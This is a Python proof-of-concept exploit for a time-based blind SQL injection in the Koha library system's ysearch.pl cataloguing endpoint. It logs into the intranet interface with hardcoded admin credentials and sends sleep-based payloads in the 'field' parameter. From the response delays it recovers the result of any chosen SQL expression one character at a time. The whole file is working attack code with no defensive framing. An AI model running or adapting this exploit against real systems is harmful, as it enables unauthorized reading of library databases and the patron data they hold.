from requests import Session
import time

def do_login(userid, password, url, session):
    data = {"userid":userid, "password":password, "koha_login_context":"intranet", "branch":""}
    response = session.post(url, data=data)
    return response.cookies

def do_inject(url, sql_cmd, session):
    headers = {"Content-Type": "application/x-www-form-urlencoded",
               "Origin": "http://192.168.176.139:8081"}
    character_set = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@$%^&*()_'
    extracted_data = ''

    for i in range(1, 100):  # Assuming the length of data to be extracted is less than 100
        find_code = False
        for char in character_set:
            print(f"Testing: {i}th character")
            injection = f"1 and IF((SUBSTR({sql_cmd},{i},1)='{char}'),sleep(1.5),sleep(0))#"
            data = {"table":"biblioitems","field": injection}

            while(1):
                start_time = time.time()
                response = session.post(url, headers=headers, data=data)
                end_time = time.time()

                #if int(response.headers['Content-Length']) > 0:
                if "[]" in response.text:
                    break

            if end_time - start_time >= 3:
                print("sleep time: " + str(end_time - start_time))
                find_code = True
                print(f"Find: {char}")
                extracted_data += char
                break
            print(extracted_data)
        if find_code == False:
            break

    return extracted_data

def main():
    login_url = "http://192.168.176.139:8081/cgi-bin/koha/mainpage.pl" # intranet web interface login url
    inject_url = "http://192.168.176.139:8081/cgi-bin/koha/cataloguing/ysearch.pl" # intranet web interface ysearch url
    userid = "admin"
    password = "Admin123"
    s = Session()
 
    do_login(userid, password, login_url, s)

    sql_cmd = "database()" # here is the sql command which you want to exec
    result = do_inject(inject_url, sql_cmd, s)
    print(f"{sql_cmd} result is: " + result)

if __name__ == "__main__":
    main()